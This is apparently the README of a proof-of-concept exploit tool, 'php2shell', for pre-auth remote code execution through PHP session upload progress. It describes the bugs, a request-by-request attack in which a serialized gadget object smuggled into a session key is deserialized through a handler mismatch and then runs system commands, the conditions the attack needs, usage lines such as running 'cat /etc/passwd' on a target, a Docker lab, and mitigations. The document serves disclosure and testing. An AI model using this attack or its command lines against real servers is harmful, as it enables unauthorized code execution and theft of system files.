# php2shell

CVE-2026-109618 / CVE-2026-109619. Pre-auth RCE through PHP `session.upload_progress`.

## The bugs

Three bugs in `php_session_rfc1867_callback` (`ext/session/session.c`):

1. `MULTIPART_EVENT_FORMDATA` accepts `PHPSESSID` from the POST body, bypassing `session.use_only_cookies=1`. The attacker picks the session ID and controls the session file path on disk. (CVE-2026-109619)

2. `post_bytes_processed` and `current_file_bytes_processed` are raw `zval*` pointers into the session HashTable's `arData`. They are cached once via `zend_hash_str_find` and never refreshed when `php_session_initialize()` reallocates `arData`. A timed stall between upload chunks forces a second `update()` whose `initialize()` frees the old `arData`. Later `Z_LVAL_P` writes land in freed memory. (CVE-2026-109618)

3. The `PHP_SESSION_UPLOAD_PROGRESS` form field value is stored verbatim as the session array key (`upload_progress_<VALUE>`). No validation. Serialized PHP objects, pipe characters, and arbitrary data pass straight into the session file.

Fixed by replacing `zval*` with `zend_long` and adding `php_session_rfc1867_sync_counters()`.

Affected: PHP 5.4.0 through 8.5.11. Fixed in 8.2.35, 8.3.36, 8.4.27, 8.5.12.

## How the exploit works

This PoC uses bug #3 (unsanitized session key) combined with a `session.serialize_handler` mismatch between two directories on the same server.

```
Step 1: WRITE (slow upload to a php_serialize directory)

  POST /app/index.php
  Cookie: PHPSESSID=abc123
  Content-Type: multipart/form-data

  Fields:
    PHP_SESSION_UPLOAD_PROGRESS = x|O:18:"WP_Cleanup_Handler":2:{...}
    file = [slow upload, keeps connection open]

  PHP stores the session key: upload_progress_x|O:18:"WP_Cleanup_Handler":2:{...}
  php_serialize writes: a:1:{s:60:"upload_progress_x|O:18:...";a:5:{...}}
  The pipe and the serialized object sit inside a length-delimited string on disk.

Step 2: READ (GET to a php-handler directory, same session ID)

  GET /api/index.php
  Cookie: PHPSESSID=abc123

  session_start() reads the file with the php handler.
  The php handler scans for | as a key/value separator.
  It finds | inside the key string.
  Everything after | goes to php_var_unserialize().
  WP_Cleanup_Handler is created with attacker-controlled properties.
  Trailing data causes a decode failure.
  PHP calls PHP_VAR_UNSERIALIZE_DESTROY on partially deserialized data.
  WP_Cleanup_Handler::__destruct() fires.
  call_user_func("system", "id") runs.
```

The root cause: `php_serialize` stores session data as a single serialized array where `|` inside a key is harmless (length-delimited). The `php` handler uses `|` as a literal key/value separator. When the `php` handler reads data written by `php_serialize`, it splits at the wrong `|` and deserializes the attacker's payload.

## Conditions

All four are required.

| # | Condition | On by default? | Detail |
|---|-----------|:-:|-------|
| 1 | `session.upload_progress.enabled = On` | Yes | Allows injecting arbitrary session keys via upload |
| 2 | Handler mismatch: one directory uses `php_serialize`, another uses `php` | No | Set by `.htaccess`, `.user.ini`, or `<Directory>` config. Shows up in shared hosting, multisite, or plugins that override the handler. |
| 3 | POP gadget class loaded before `session_start()` | No | A class whose `__destruct()` calls `call_user_func()` (or `eval`, `include`) and has no `__wakeup()` that throws. Loaded via `auto_prepend_file`, plugin bootstrap, or theme. |
| 4 | At least 2 concurrent Apache/FPM workers | Yes | The writer holds the session file on disk while the reader triggers deserialization. |

## Stock WordPress is not exploitable

Tested against the official `wordpress:php8.4-apache` Docker image (PHP 8.4.26, default config).

Three things block the exploit:

1. All directories use `session.serialize_handler = php`. No directory is set to `php_serialize`. Without the mismatch, the `|` in the session key is never misinterpreted.

2. The only stock class with `call_user_func` in `__destruct()` is `WP_HTML_Token`, but its `__wakeup()` throws `LogicException` (since WP 6.4.2). On PHP 8.0+, when `__wakeup()` throws, `__destruct()` never fires. No other stock class has a usable gadget.

3. `session.upload_progress.cleanup = On` (default) deletes the session data after the upload completes, narrowing the race window.

## When a target becomes exploitable

A plugin, theme, or server config must introduce both missing conditions:

1. A directory where `session.serialize_handler = php_serialize`. Payment gateways, SSO plugins, and custom session managers sometimes do this via `.htaccess` or `.user.ini`.

2. A class with `__destruct()` calling `call_user_func()` / `eval()` / `include()` and no `__wakeup()` guard. Older plugins that implement cleanup handlers, cache wrappers, or logging often have these.

Example: a WordPress site runs a payment plugin that sets `php_serialize` in `/wp-content/plugins/pay/`, and a cache plugin whose cleanup class has an unprotected `__destruct()`.

## Usage

```bash
python3 php2shell.py http://target --check
python3 php2shell.py http://target --exploit -c 'id'

# custom paths and gadget class
python3 php2shell.py http://target --exploit -c 'id' \
  --write-path /wp-content/plugins/pay/callback.php \
  --read-path /wp-content/index.php \
  --gadget-class CacheCleanup

# tune timing
python3 php2shell.py http://target --exploit -c 'cat /etc/passwd' \
  --stall 2.0 --workers 2 -n 10
```

| Flag | Default | What it does |
|------|---------|-------------|
| `--check` | | Probe the write/read endpoints |
| `--exploit` | | Run the exploit |
| `-c` | `id` | OS command |
| `--write-path` | `/wp-content/app/index.php` | Endpoint in the `php_serialize` directory |
| `--read-path` | `/wp-content/api/index.php` | Endpoint in the `php` directory (must call `session_start()`) |
| `--gadget-class` | `WP_Cleanup_Handler` | POP gadget class name |
| `--stall` | `1.35` | Seconds before the reader fires |
| `--workers` | `1` | Writer threads |
| `-n` | `5` | Max attempts |

## Lab

The `lab/` directory ships a Docker lab that adds the two missing conditions:

- Apache `<Directory>` sets `php_serialize` on `/wp-content/app/` and `php` on `/wp-content/api/`
- `auto_prepend_file` loads a `WP_Cleanup_Handler` class (simulates a plugin with `call_user_func` in `__destruct`, no `__wakeup`)

```bash
cd lab && docker compose up -d
python3 php2shell.py http://127.0.0.1:8888 --check
python3 php2shell.py http://127.0.0.1:8888 --exploit -c 'id'
```

Ubuntu 26.04, PHP 8.5.4, Apache prefork, WordPress 7.1.3.

## Mitigation

Patch PHP to 8.2.35+, 8.3.36+, 8.4.27+, or 8.5.12+.

Or disable upload progress tracking:

```ini
session.upload_progress.enabled = Off
```

Also worth doing:

- Keep the same `session.serialize_handler` across all directories. Mixing `php` and `php_serialize` is what creates the injection point.
- Audit plugin and theme classes for unprotected `__destruct()` methods.
- Leave `session.upload_progress.cleanup = On` (the default). It shrinks the race window.

## References

- https://www.php.net/archive/2026.php#2026-10-20-1 (PHP advisory)

## Disclaimer

For authorized defensive research and security testing only.
